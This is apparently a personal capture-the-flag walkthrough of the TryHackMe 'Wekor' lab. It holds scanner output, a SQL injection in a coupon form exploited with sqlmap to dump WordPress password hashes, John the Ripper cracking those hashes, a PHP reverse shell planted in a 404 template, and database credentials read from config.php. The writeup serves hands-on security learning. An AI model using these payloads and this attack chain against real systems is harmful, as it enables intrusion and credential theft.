@@ -1,0 +1,996 @@
+Wekor IP:10.10.182.108
+
+
+rustscan:
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+
+nmap:
+
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 95:c3:ce:af:07:fa:e2:8e:29:04:e4:cd:14:6a:21:b5 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDn0l/KSmAk6LfT9R73YXvsc6g8qGZvMS+A5lJ19L4G5xbhSpCoEN0kBEZZQfI80sEU7boAfD0/VcdFhURkPxDUdN1wN7a/4alpMMMKf2ey0tpnWTn9nM9JVVI9rloaiD8nIuLesjigq+eEQCaEijfArUtzAJpESwRHrtm2OWTJ+PYNt1NDIbQm1HJHPasD7Im/wW6MF04mB04UrTwhWBHV4lziH7Rk8DYOI1xxfzz7J8bIatuWaRe879XtYA0RgepMzoXKHfLXrOlWJusPtMO2x+ATN2CBEhnNzxiXq+2In/RYMu58uvPBeabSa74BthiucrdJdSwobYVIL27kCt89
+|   256 4d:99:b5:68:af:bb:4e:66:ce:72:70:e6:e3:f8:96:a4 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKJLaFNlUUzaESL+JpUKy/u7jH4OX+57J/GtTCgmoGOg4Fh8mGqS8r5HAgBMg/Bq2i9OHuTMuqazw//oQtRYOhE=
+|   256 0d:e5:7d:e8:1a:12:c0:dd:b7:66:5e:98:34:55:59:f6 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJvvZ5IaMI7DHXHlMkfmqQeKKGHVMSEYbz0bYhIqPp62
+80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+| http-robots.txt: 9 disallowed entries 
+| /workshop/ /root/ /lol/ /agent/ /feed /crawler /boot 
+|_/comingreallysoon /interesting
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+nikto:
+
+
+ikto -h 10.10.182.108                                                                                                                                                               
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.182.108
++ Target Hostname:    10.10.182.108
++ Target Port:        80
++ Start Time:         2023-06-21 09:00:06 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Entry '/comingreallysoon/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 9 entries which should be manually viewed.
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7900 requests: 0 error(s) and 8 item(s) reported on remote host
++ End Time:           2023-06-21 09:12:13 (GMT-4) (727 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+
+
+
+
+
+
+
+
+
+gobuster:
+/index.html (Status: 200)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+
+
+
+robots.txt:
+
+User-agent: *
+Disallow: /workshop/
+Disallow: /root/
+Disallow: /lol/
+Disallow: /agent/
+Disallow: /feed
+Disallow: /crawler
+Disallow: /boot
+Disallow: /comingreallysoon
+Disallow: /interesting
+
+
+wekor.thm/comingreallysoon/
+
+Welcome Dear Client! We've setup our latest website on /it-next, Please go check it out! If you have any comments or suggestions, please tweet them to @faketwitteraccount! Thanks a lot ! 
+
+gobuster dir -u http://wekor.thm/it-next/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://wekor.thm/it-next/
+[+] Threads:        64
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2023/06/21 09:16:46 Starting gobuster
+===============================================================
+/images (Status: 301)
+/css (Status: 301)
+/js (Status: 301)
+/fonts (Status: 301)
+/revolution (Status: 301)
+===============================================================
+2023/06/21 09:21:46 Finished
+===============================================================
+
+
+
+
+vhosts:
+
+
+gobuster vhost  -u http://wekor.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 64  
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:          http://wekor.thm
+[+] Threads:      64
+[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+[+] User Agent:   gobuster/3.0.1
+[+] Timeout:      10s
+===============================================================
+2023/06/21 09:22:50 Starting gobuster
+===============================================================
+Found: site.wekor.thm (Status: 200) [Size: 143]
+
+
+visiting;
+
+Hi there! Nothing here for now, but there should be an amazing website here in about 2 weeks, SO DON'T FORGET TO COME BACK IN 2 WEEKS! - Jim 
+
+gobuster dir -u http://site.wekor.thm -w /usr/share/wordlists/dirb/common.txt -t 64                                                                                                        130 ⨯
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://site.wekor.thm
+[+] Threads:        64
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2023/06/21 09:25:52 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/index.html (Status: 200)
+/server-status (Status: 403)
+/wordpress (Status: 301)
+===============================================================
+2023/06/21 09:25:59 Finished
+===============================================================
+
+
+wpscan:
+
+wpscan --url http://site.wekor.thm/wordpress/ -e ap,u                                                                 
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.22
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] It seems like you have not updated the database for some time.
+[?] Do you want to update now? [Y]es [N]o, default: [N]
+[+] URL: http://site.wekor.thm/wordpress/ [10.10.182.108]
+[+] Started: Wed Jun 21 09:27:31 2023
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://site.wekor.thm/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://site.wekor.thm/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://site.wekor.thm/wordpress/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://site.wekor.thm/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.6 identified (Insecure, released on 2020-12-08).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://site.wekor.thm/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.6</generator>
+ |  - http://site.wekor.thm/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.6</generator>
+
+[+] WordPress theme in use: twentytwentyone
+ | Location: http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/
+ | Last Updated: 2022-11-02T00:00:00.000Z
+ | Readme: http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/readme.txt
+ | [!] The version is out of date, the latest version is 1.7
+ | Style URL: http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/style.css?ver=1.0
+ | Style Name: Twenty Twenty-One
+ | Style URI: https://wordpress.org/themes/twentytwentyone/
+ | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.0 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/style.css?ver=1.0, Match: 'Version: 1.0'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 <=======================================================================================================================> (10 / 10) 100.00% Time: 00:00:00
+
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://site.wekor.thm/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Wed Jun 21 09:27:40 2023
+[+] Requests Done: 54
+[+] Cached Requests: 6
+[+] Data Sent: 14.766 KB
+[+] Data Received: 396.075 KB
+[+] Memory used: 239.094 MB
+[+] Elapsed time: 00:00:08
+
+
+on the apply cuppon from shoping cart, we have sql injeciton
+I tried the basic ' or 1 = 1 -- - and it worked on the first try.
+
+Coupon Code : 12345 With ID : 1 And With Expire Date Of : doesnotexpire Is Valid!
+
+capture the request in burp:
+
+
+POST /it-next/it_cart.php HTTP/1.1
+Host: 10.10.182.108
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 55
+Origin: http://10.10.182.108
+Connection: close
+Referer: http://10.10.182.108/it-next/it_cart.php
+Upgrade-Insecure-Requests: 1
+
+coupon_code=%27+or+1%3D1+--+-&apply_coupon=Apply+Coupon
+
+time to use sqlmap for an sql injection
+
+
+sqlmap -u http://wekor.thm/it-next/it_cart.php --forms "coupon_code=%27+or+1%3D1+--+-&apply_coupon=Apply+Coupon" --dump
+        ___
+       __H__                                                                                                                                                                                         
+ ___ ___[']_____ ___ ___  {1.6.12#stable}                                                                                                                                                            
+|_ -| . [.]     | .'| . |                                                                                                                                                                            
+|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 09:50:18 /2023-06-21/
+
+[09:50:18] [INFO] testing connection to the target URL
+[09:50:19] [INFO] searching for forms
+[09:50:19] [INFO] found a total of 3 targets
+[1/3] Form:
+POST http://wekor.thm/it-next/it_cart.php
+POST data: coupon_code=&apply_coupon=Apply%20Coupon
+do you want to test this form? [Y/n/q] 
+> y
+Edit POST data [default: coupon_code=&apply_coupon=Apply%20Coupon] (Warning: blank fields detected): 
+do you want to fill blank fields with random values? [Y/n] 
+[09:50:38] [INFO] using '/home/kali/.local/share/sqlmap/output/results-06212023_0950am.csv' as the CSV results file in multiple targets mode
+[09:50:39] [INFO] testing if the target URL content is stable
+[09:50:39] [INFO] target URL content is stable
+[09:50:39] [INFO] testing if POST parameter 'coupon_code' is dynamic
+[09:50:39] [WARNING] POST parameter 'coupon_code' does not appear to be dynamic
+[09:50:40] [INFO] heuristic (basic) test shows that POST parameter 'coupon_code' might be injectable (possible DBMS: 'MySQL')
+[09:50:40] [INFO] heuristic (XSS) test shows that POST parameter 'coupon_code' might be vulnerable to cross-site scripting (XSS) attacks
+[09:50:40] [INFO] testing for SQL injection on POST parameter 'coupon_code'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
+[09:50:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[09:50:51] [WARNING] reflective value(s) found and filtering out
+[09:50:52] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[09:50:53] [INFO] testing 'Generic inline queries'
+[09:50:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[09:50:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[09:51:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[09:51:02] [INFO] POST parameter 'coupon_code' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --string="Coupon Code Does Not Exist!")
+[09:51:02] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[09:51:02] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[09:51:02] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[09:51:02] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[09:51:02] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[09:51:03] [INFO] POST parameter 'coupon_code' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
+[09:51:03] [INFO] testing 'MySQL inline queries'
+[09:51:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[09:51:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[09:51:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[09:51:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[09:51:03] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[09:51:03] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[09:51:03] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[09:51:14] [INFO] POST parameter 'coupon_code' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[09:51:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[09:51:14] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[09:51:14] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[09:51:14] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[09:51:14] [INFO] target URL appears to have 3 columns in query
+[09:51:15] [INFO] POST parameter 'coupon_code' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
+[09:51:15] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+POST parameter 'coupon_code' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 125 HTTP(s) requests:
+---
+Parameter: coupon_code (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: coupon_code=cDcc' OR NOT 7947=7947#&apply_coupon=Apply Coupon
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: coupon_code=cDcc' AND GTID_SUBSET(CONCAT(0x71786a7671,(SELECT (ELT(2736=2736,1))),0x7162707071),2736)-- kwYf&apply_coupon=Apply Coupon
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: coupon_code=cDcc' AND (SELECT 5009 FROM (SELECT(SLEEP(5)))qJxJ)-- wqwD&apply_coupon=Apply Coupon
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: coupon_code=cDcc' UNION ALL SELECT CONCAT(0x71786a7671,0x44446a4471484457794d454d4b764b6376545171504b786143424d4952464c784f53734665674477,0x7162707071),NULL,NULL#&apply_coupon=Apply Coupon
+---
+do you want to exploit this SQL injection? [Y/n] y
+[09:51:26] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.6
+[09:51:26] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[09:51:26] [INFO] fetching current database
+[09:51:26] [INFO] fetching tables for database: 'coupons'
+[09:51:27] [INFO] fetching columns for table 'valid_coupons' in database 'coupons'
+[09:51:27] [INFO] fetching entries for table 'valid_coupons' in database 'coupons'
+Database: coupons
+Table: valid_coupons
+[1 entry]
++----+--------+---------------+
+| id | coupon | expire_date   |
++----+--------+---------------+
+| 1  | 12345  | doesnotexpire |
++----+--------+---------------+
+
+[09:51:27] [INFO] table 'coupons.valid_coupons' dumped to CSV file '/home/kali/.local/share/sqlmap/output/wekor.thm/dump/coupons/valid_coupons.csv'
+[09:51:27] [INFO] skipping 'http://wekor.thm/it-next/it_cart.php'
+SQL injection vulnerability has already been detected against 'wekor.thm'. Do you want to skip further tests involving it? [Y/n] y
+[09:51:33] [INFO] skipping 'http://wekor.thm/it-next/it_cart.php?s='
+[09:51:33] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-06212023_0950am.csv'
+[09:51:33] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 09:51:33 /2023-06-21/
+
+
+
+
+
+dump the schema:
+
+sqlmap -u http://wekor.thm/it-next/it_cart.php --forms "coupon_code=%27+or+1%3D1+--+-&apply_coupon=Apply+Coupon" --dump
+
+
+a lot of db's are present here. we are interested in the wordpress db:
+
+
+
+Database: wordpress
+Table: wp_users
+[10 columns]
++---------------------+---------------------+
+| Column              | Type                |
++---------------------+---------------------+
+| display_name        | varchar(250)        |
+| ID                  | bigint(20) unsigned |
+| user_activation_key | varchar(255)        |
+| user_email          | varchar(100)        |
+| user_login          | varchar(60)         |
+| user_nicename       | varchar(50)         |
+| user_pass           | varchar(255)        |
+| user_registered     | datetime            |
+| user_status         | int(11)             |
+| user_url            | varchar(100)        |
++---------------------+---------------------+
+
+
+get user hashess:
+
+sqlmap -u http://wekor.thm/it-next/it_cart.php --forms "coupon_code=%27+or+1%3D1+--+-&apply_coupon=Apply+Coupon" -D wordpress -T wp_users --dump
+        ___
+       __H__                                                                                                                                                                                         
+ ___ ___[,]_____ ___ ___  {1.6.12#stable}                                                                                                                                                            
+|_ -| . [)]     | .'| . |                                                                                                                                                                            
+|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 09:56:00 /2023-06-21/
+
+[09:56:00] [INFO] testing connection to the target URL
+[09:56:01] [INFO] searching for forms
+[09:56:01] [INFO] found a total of 3 targets
+[1/3] Form:
+POST http://wekor.thm/it-next/it_cart.php
+POST data: coupon_code=&apply_coupon=Apply%20Coupon
+do you want to test this form? [Y/n/q] 
+> y
+Edit POST data [default: coupon_code=&apply_coupon=Apply%20Coupon] (Warning: blank fields detected): 
+do you want to fill blank fields with random values? [Y/n] 
+[09:56:05] [INFO] resuming back-end DBMS 'mysql' 
+[09:56:05] [INFO] using '/home/kali/.local/share/sqlmap/output/results-06212023_0956am.csv' as the CSV results file in multiple targets mode
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: coupon_code (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: coupon_code=cDcc' OR NOT 7947=7947#&apply_coupon=Apply Coupon
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: coupon_code=cDcc' AND GTID_SUBSET(CONCAT(0x71786a7671,(SELECT (ELT(2736=2736,1))),0x7162707071),2736)-- kwYf&apply_coupon=Apply Coupon
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: coupon_code=cDcc' AND (SELECT 5009 FROM (SELECT(SLEEP(5)))qJxJ)-- wqwD&apply_coupon=Apply Coupon
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: coupon_code=cDcc' UNION ALL SELECT CONCAT(0x71786a7671,0x44446a4471484457794d454d4b764b6376545171504b786143424d4952464c784f53734665674477,0x7162707071),NULL,NULL#&apply_coupon=Apply Coupon
+---
+do you want to exploit this SQL injection? [Y/n] y
+[09:56:08] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.6
+[09:56:08] [INFO] fetching columns for table 'wp_users' in database 'wordpress'
+[09:56:08] [INFO] fetching entries for table 'wp_users' in database 'wordpress'
+[09:56:08] [INFO] recognized possible password hashes in column 'user_pass'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+[09:56:17] [INFO] writing hashes to a temporary file '/tmp/sqlmap2muvlfdq4041/sqlmaphashes-_mdgkc85.txt' 
+do you want to crack them via a dictionary-based attack? [y/N/q] n
+Database: wordpress
+Table: wp_users
+[4 entries]
++------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
+| ID   | user_url                        | user_pass                          | user_email        | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key                           |
++------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
+| 1    | http://site.wekor.thm/wordpress | $P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B. | admin@wekor.thm   | admin      | 0           | admin        | admin         | 2021-01-21 20:33:37 | <blank>                                       |
+| 5743 | http://jeffrey.com              | $P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10 | jeffrey@wekor.thm | wp_jeffrey | 0           | wp jeffrey   | wp_jeffrey    | 2021-01-21 20:34:50 | 1611261290:$P$BufzJsT0fhM94swehg1bpDVTupoxPE0 |
+| 5773 | http://yura.com                 | $P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/ | yura@wekor.thm    | wp_yura    | 0           | wp yura      | wp_yura       | 2021-01-21 20:35:27 | <blank>                                       |
+| 5873 | http://eagle.com                | $P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/ | eagle@wekor.thm   | wp_eagle   | 0           | wp eagle     | wp_eagle      | 2021-01-21 20:36:11 | <blank>                                       |
++------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
+
+[09:56:21] [INFO] table 'wordpress.wp_users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/wekor.thm/dump/wordpress/wp_users.csv'
+SQL injection vulnerability has already been detected against 'wekor.thm'. Do you want to skip further tests involving it? [Y/n] y
+[09:56:31] [INFO] skipping 'http://wekor.thm/it-next/it_cart.php?s='
+[09:56:31] [INFO] skipping 'http://wekor.thm/it-next/it_cart.php'
+[09:56:31] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-06212023_0956am.csv'
+[09:56:31] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 09:56:31 /2023-06-21/
+
+
+
+we can now use john to crack the passwd:
+
+┌──(kali㉿kali)-[~/Practice/tryhackme/Wekor]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt wp_jeffrey                                                                                                                                  1 ⨯
+Using default input encoding: UTF-8
+Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+rockyou          (?)     
+1g 0:00:00:00 DONE (2023-06-21 09:59) 50.00g/s 28800p/s 28800c/s 28800C/s 123456..parola
+Use the "--show --format=phpass" options to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                                                                                                     
+┌──(kali㉿kali)-[~/Practice/tryhackme/Wekor]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt wp_yura 
+Using default input encoding: UTF-8
+Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+soccer13         (?)     
+1g 0:00:00:00 DONE (2023-06-21 10:00) 14.28g/s 41142p/s 41142c/s 41142C/s skyblue..soccer9
+Use the "--show --format=phpass" options to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                                                                                                     
+┌──(kali㉿kali)-[~/Practice/tryhackme/Wekor]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt wp_eagle 
+Using default input encoding: UTF-8
+Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+xxxxxx           (?)     
+1g 0:00:00:00 DONE (2023-06-21 10:01) 11.11g/s 12800p/s 12800c/s 12800C/s evelyn..summer1
+Use the "--show --format=phpass" options to display all of the cracked passwords reliably
+Session completed. 
+
+we login as yura, and upload a php reverse shell in 404 template
+
+we open a nc listener, and then we visit a page that does not exist:
+
+http://site.wekor.thm/wordpress/index.php/abc
+
+then we get a reverse shell:
+
+nc -lnvp 9001                             
+listening on [any] 9001 ...
+connect to [10.8.29.89] from (UNKNOWN) [10.10.182.108] 51858
+Linux osboxes 4.15.0-132-generic #136~16.04.1-Ubuntu SMP Tue Jan 12 18:18:45 UTC 2021 i686 i686 i686 GNU/Linux
+ 10:07:18 up  1:08,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+
+www-data@osboxes:/home$ cd Orka 
+cd Orka
+bash: cd: Orka: Permission denied
+www-data@osboxes:/home$ cd /var/www
+cd /var/www
+www-data@osboxes:/var/www$ ls
+ls
+html
+www-data@osboxes:/var/www$ cd html
+cd html
+www-data@osboxes:/var/www/html$ ls
+ls
+comingreallysoon  index.html  it-next  robots.txt  site.wekor.thm
+www-data@osboxes:/var/www/html$ cd it-next
+cd it-next
+www-data@osboxes:/var/www/html/it-next$ ls
+ls
+config.php          it_checkout.php          it_price.php
+contact.php         it_computer_repair.php   it_privacy_policy.php
+css                 it_contact.php           it_service.php
+fonts               it_contact_2.php         it_service_detail.php
+images              it_data_recovery.php     it_service_list.php
+index.php           it_error.php             it_shop.php
+it_about.php        it_faq.php               it_shop_detail.php
+it_blog.php         it_home.php              it_techn_support.php
+it_blog_detail.php  it_home_dark.php         it_term_condition.php
+it_blog_grid.php    it_mobile_service.php    js
+it_career.php       it_network_solution.php  make_appointment.php
+it_cart.php         it_news.php              revolution
+www-data@osboxes:/var/www/html/it-next$ cat config.php
+cat config.php
+<?php
+
+define("DB_SERVER","localhost");
+
+define("DB_USERNAME" , "root");
+
+define("DB_PASSWORD", "root123@#59");
+
+define("DB_DATABASE", "coupons");
+
+$db = new mysqli(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
+$db->set_charset("utf8");
+
+?>
